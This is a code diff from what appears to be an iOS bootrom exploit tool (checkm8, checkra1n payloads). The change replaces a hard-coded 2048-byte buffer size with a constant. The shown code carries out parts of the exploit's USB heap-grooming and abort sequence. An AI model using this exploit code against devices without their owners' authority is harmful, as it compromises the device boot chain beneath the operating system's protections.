@@ -26,7 +26,7 @@
 #include <io/iousb.h>
 #include <common/common.h>
 
-static unsigned char blank[2048];
+static unsigned char blank[DFU_MAX_TRANSFER_SZ];
 
 static void set_global_state(io_client_t client)
 {
@@ -34,12 +34,12 @@ static void set_global_state(io_client_t client)
     unsigned int val;
     UInt32 sent;
     
-    memset(&blank, '\x41', 2048);
+    memset(&blank, '\x41', DFU_MAX_TRANSFER_SZ);
     
     val = 704; // A8/A8X/A9
     
     int i=0;
-    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) != 0x40){
+    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 0)) != 0x40){
         i++;
         DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
         usleep(10000);
@@ -61,9 +61,6 @@ static void heap_occupation(io_client_t client, checkra1n_payload_t payload)
 {
     transfer_t result;
     
-    memset(&blank, '\0', 2048);
-    
-    // over1 = dummy
     result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
     DEBUGLOG("[%s] (1/2) %x", __FUNCTION__, result.ret);
     result = send_abort(client);
@@ -76,11 +73,11 @@ int checkm8_t7000_s8000(io_client_t client, checkra1n_payload_t payload)
     
     transfer_t result;
     
-    memset(&blank, '\0', 2048);
+    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
     
     LOG_EXPLOIT_NAME("checkm8");
     
-    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
+    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ);
     usleep(1000);
     
     LOG("[%s] reconnecting", __FUNCTION__);
